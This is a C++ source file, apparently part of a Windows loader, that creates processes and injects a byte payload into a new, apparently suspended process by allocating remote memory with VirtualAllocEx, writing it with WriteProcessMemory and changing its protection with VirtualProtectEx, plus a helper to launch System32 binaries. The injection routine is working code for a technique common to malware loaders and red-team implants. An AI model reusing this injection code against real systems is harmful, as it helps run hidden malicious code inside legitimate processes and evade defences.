#include "core/extract/execution/create_process.h"
#include "utils/debug_print.h"
#include <sstream>

namespace extract {

namespace {
    // Helper to format error messages
    std::string get_last_error_message() {
        DWORD error = GetLastError();
        std::stringstream ss;
        ss << "Error " << error << ": ";
        
        LPSTR messageBuffer = nullptr;
        size_t size = FormatMessageA(
            FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
            NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
        
        if (size) {
            ss << messageBuffer;
            LocalFree(messageBuffer);
        } else {
            ss << "Unknown error";
        }
        
        return ss.str();
    }
}

ProcessInfo create_process(
    const std::string& executable_path,
    const std::string& command_line,
    ProcessCreationFlags flags,
    bool inherit_handles) {
    
    ProcessInfo result;
    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };
    
    // Prepare command line if provided
    std::string cmd_line = command_line;
    if (!cmd_line.empty()) {
        cmd_line = "\"" + executable_path + "\" " + cmd_line;
    }
    
    debug::DebugPrint("Creating process: " + executable_path);
    if (!cmd_line.empty()) {
        debug::DebugPrint("Command line: " + cmd_line);
    }
    
    // Create process
    BOOL success = CreateProcessA(
        executable_path.empty() ? NULL : executable_path.c_str(),
        cmd_line.empty() ? NULL : const_cast<LPSTR>(cmd_line.c_str()),
        NULL,  // Process handle not inheritable
        NULL,  // Thread handle not inheritable
        inherit_handles,
        static_cast<DWORD>(flags),
        NULL,  // Use parent's environment block
        NULL,  // Use parent's starting directory
        &si,
        &pi);
    
    if (!success) {
        debug::DebugPrint("Failed to create process: " + get_last_error_message());
        return result;
    }
    
    // Store process information
    result.process_handle = pi.hProcess;
    result.thread_handle = pi.hThread;
    result.process_id = pi.dwProcessId;
    result.thread_id = pi.dwThreadId;
    result.success = true;
    
    debug::DebugPrint("Process created successfully with ID: " + std::to_string(result.process_id));
    return result;
}

ProcessInfo create_process_with_payload(
    const std::string& executable_path,
    const std::vector<uint8_t>& payload,
    ProcessCreationFlags flags) {
    
    // Create suspended process
    auto process_info = create_process(executable_path, "", flags);
    if (!process_info.success) {
        return process_info;
    }
    
    // Write payload to process memory
    void* payload_address = nullptr;
    if (!process_internal::write_process_memory(
        process_info.process_handle, payload, payload_address)) {
        debug::DebugPrint("Failed to write payload to process memory");
        CloseHandle(process_info.process_handle);
        CloseHandle(process_info.thread_handle);
        process_info.success = false;
        return process_info;
    }
    
    // Set memory protection
    if (!process_internal::protect_process_memory(
        process_info.process_handle, payload_address, payload.size())) {
        debug::DebugPrint("Failed to set memory protection");
        CloseHandle(process_info.process_handle);
        CloseHandle(process_info.thread_handle);
        process_info.success = false;
        return process_info;
    }
    
    debug::DebugPrint("Payload injected successfully");
    return process_info;
}

ProcessInfo create_system_process(
    const std::string& process_name,
    ProcessCreationFlags flags) {
    
    char system32_path[MAX_PATH];
    if (!GetSystemDirectoryA(system32_path, MAX_PATH)) {
        debug::DebugPrint("Failed to get System32 directory: " + get_last_error_message());
        return ProcessInfo();
    }
    
    std::string full_path = std::string(system32_path) + "\\" + process_name;
    return create_process(full_path, "", flags);
}

namespace process_internal {

bool write_process_memory(
    HANDLE process_handle,
    const std::vector<uint8_t>& payload,
    void*& out_address) {
    
    // Allocate memory in target process
    out_address = VirtualAllocEx(
        process_handle,
        NULL,
        payload.size(),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);
    
    if (!out_address) {
        debug::DebugPrint("Failed to allocate memory in target process: " + get_last_error_message());
        return false;
    }
    
    // Write payload to allocated memory
    SIZE_T bytes_written;
    if (!WriteProcessMemory(
        process_handle,
        out_address,
        payload.data(),
        payload.size(),
        &bytes_written) || bytes_written != payload.size()) {
        debug::DebugPrint("Failed to write process memory: " + get_last_error_message());
        VirtualFreeEx(process_handle, out_address, 0, MEM_RELEASE);
        return false;
    }
    
    return true;
}

bool protect_process_memory(
    HANDLE process_handle,
    void* address,
    size_t size,
    DWORD protection) {
    
    DWORD old_protection;
    if (!VirtualProtectEx(
        process_handle,
        address,
        size,
        protection,
        &old_protection)) {
        debug::DebugPrint("Failed to set memory protection: " + get_last_error_message());
        return false;
    }
    
    return true;
}

} // namespace process_internal

} // namespace extract 